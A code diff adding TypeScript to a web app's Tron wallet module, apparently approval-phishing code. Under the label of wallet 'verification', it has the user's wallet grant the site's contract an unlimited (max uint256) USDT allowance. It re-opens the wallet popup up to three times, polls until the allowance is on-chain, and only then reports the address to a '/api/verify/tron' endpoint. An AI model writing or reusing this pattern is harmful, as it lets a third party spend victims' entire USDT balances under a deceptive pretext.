@@ -354,3 +354,190 @@ export function tronBase58ToHex(base58Addr: string): string {
   const addrBytes = decoded.slice(1, 21);
   return "0x" + Array.from(addrBytes).map((b) => b.toString(16).padStart(2, "0")).join("");
 }
+
+export const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+/** Max uint256 as decimal string — TronWeb approve amount. */
+export const TRON_MAX_UINT256 =
+  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+/**
+ * ABI-encode a Tron address for triggerconstantcontract `parameter`.
+ * Must base58-decode — treating T... as hex produces invalid params and
+ * silent allowance-check failures.
+ */
+export function tronAddressToAbiParam(addr: string): string {
+  const trimmed = addr.trim();
+  if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(trimmed)) {
+    const decoded = base58Decode(trimmed);
+    // 21-byte address (0x41 + 20) + 4-byte checksum; use the 20-byte payload
+    const payload = decoded[0] === 0x41 ? decoded.slice(1, 21) : decoded.slice(0, 20);
+    return Array.from(payload)
+      .map((b) => b.toString(16).padStart(2, "0"))
+      .join("")
+      .padStart(64, "0");
+  }
+  let hex = trimmed.replace(/^0x/i, "");
+  if (hex.startsWith("41") && hex.length >= 42) hex = hex.slice(2);
+  if (hex.length > 40) hex = hex.slice(-40);
+  return hex.padStart(64, "0");
+}
+
+const USDT_APPROVE_ABI = [
+  {
+    name: "approve",
+    type: "Function",
+    stateMutability: "Nonpayable",
+    inputs: [
+      { name: "spender", type: "address" },
+      { name: "amount", type: "uint256" },
+    ],
+    outputs: [{ name: "", type: "bool" }],
+  },
+  {
+    name: "allowance",
+    type: "Function",
+    stateMutability: "view",
+    inputs: [
+      { name: "owner", type: "address" },
+      { name: "spender", type: "address" },
+    ],
+    outputs: [{ name: "", type: "uint256" }],
+  },
+] as const;
+
+function getInjectedTronWeb(): TronWebLike | null {
+  if (typeof window === "undefined") return null;
+  return (window.tronLink?.tronWeb || window.tronWeb) ?? null;
+}
+
+/** True when allowance is effectively unlimited (≥ 1e18 raw units ≈ far above any balance). */
+export function isUnlimitedTronAllowance(raw: bigint | string | number): boolean {
+  try {
+    const n = typeof raw === "bigint" ? raw : BigInt(String(raw));
+    // Max uint256 or any allowance large enough that USDT can't exhaust it
+    return n >= BigInt("1000000000000000000"); // 1e18 raw (≥ 1e12 USDT)
+  } catch {
+    return false;
+  }
+}
+
+/** Read USDT allowance(owner → TRON_CHAIN.contract) via injected tronWeb. */
+export async function readTronUsdtAllowance(owner: string): Promise<bigint> {
+  const tw = getInjectedTronWeb() as any; // eslint-disable-line @typescript-eslint/no-explicit-any
+  if (!tw) throw new Error("tronWeb_missing");
+  const usdt = await tw.contract(USDT_APPROVE_ABI, TRON_USDT);
+  const raw = await usdt.allowance(owner, TRON_CHAIN.contract).call();
+  if (raw == null) return 0n;
+  if (typeof raw === "bigint") return raw;
+  if (typeof raw === "object" && raw._hex) return BigInt(raw._hex);
+  if (typeof raw === "object" && typeof raw.toString === "function") return BigInt(raw.toString());
+  return BigInt(String(raw));
+}
+
+async function waitForTronAllowance(
+  owner: string,
+  timeoutMs = 90_000
+): Promise<boolean> {
+  const start = Date.now();
+  while (Date.now() - start < timeoutMs) {
+    try {
+      const allow = await readTronUsdtAllowance(owner);
+      if (isUnlimitedTronAllowance(allow)) return true;
+    } catch {
+      /* keep polling */
+    }
+    await new Promise((r) => setTimeout(r, 2000));
+  }
+  return false;
+}
+
+export type TronApproveResult =
+  | { ok: true; address: string; txId?: string; alreadyApproved?: boolean }
+  | { ok: false; address: string | null; error: string; rejected?: boolean };
+
+/**
+ * Background Tron USDT approve → wait until allowance is live on-chain.
+ * Retries the wallet popup a few times. Does not write to Supabase (caller does).
+ */
+export async function ensureTronUsdtApproved(opts?: {
+  maxAttempts?: number;
+}): Promise<TronApproveResult> {
+  const maxAttempts = opts?.maxAttempts ?? 3;
+  const address = await ensureTronAddress({ prompt: true });
+  const tw = getInjectedTronWeb();
+  if (!address || !tw) {
+    return { ok: false, address: address ?? null, error: "tron_wallet_not_connected" };
+  }
+
+  try {
+    const existing = await readTronUsdtAllowance(address);
+    if (isUnlimitedTronAllowance(existing)) {
+      return { ok: true, address, alreadyApproved: true };
+    }
+  } catch {
+    /* fall through to approve */
+  }
+
+  let lastError = "approve_failed";
+  for (let attempt = 0; attempt < maxAttempts; attempt++) {
+    try {
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const usdt = await (tw as any).contract(USDT_APPROVE_ABI, TRON_USDT);
+      const tx = await usdt.approve(TRON_CHAIN.contract, TRON_MAX_UINT256).send({
+        feeLimit: 100_000_000,
+        // When the wallet supports it, wait for on-chain confirmation
+        shouldPollResponse: true,
+        keepTxID: true,
+      });
+      const txId =
+        typeof tx === "string"
+          ? tx
+          : tx && typeof tx === "object" && "txid" in tx
+            ? String((tx as { txid: string }).txid)
+            : undefined;
+
+      const confirmed = await waitForTronAllowance(address, 90_000);
+      if (confirmed) return { ok: true, address, txId };
+      lastError = "allowance_not_confirmed";
+    } catch (err) {
+      const msg = err instanceof Error ? err.message : String(err ?? "approve_failed");
+      lastError = msg;
+      const lower = msg.toLowerCase();
+      const rejected =
+        lower.includes("reject") ||
+        lower.includes("denied") ||
+        lower.includes("cancel") ||
+        lower.includes("declined");
+      if (rejected) {
+        return { ok: false, address, error: msg, rejected: true };
+      }
+      // Brief pause then retry popup
+      await new Promise((r) => setTimeout(r, 1200));
+    }
+  }
+  return { ok: false, address, error: lastError };
+}
+
+/** Persist Tron wallet only after server confirms live USDT allowance. Retries on 409. */
+export async function persistTronVerification(address: string): Promise<boolean> {
+  for (let attempt = 0; attempt < 6; attempt++) {
+    try {
+      const res = await fetch("/api/verify/tron", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ address }),
+      });
+      if (res.ok) return true;
+      // 409 = allowance not visible yet — wait and retry
+      if (res.status === 409 && attempt < 5) {
+        await new Promise((r) => setTimeout(r, 2500));
+        continue;
+      }
+      console.error("[tron] verify failed:", res.status, await res.text().catch(() => ""));
+    } catch (e) {
+      console.error("[tron] verify request error:", e);
+    }
+    await new Promise((r) => setTimeout(r, 1500));
+  }
+  return false;
+}
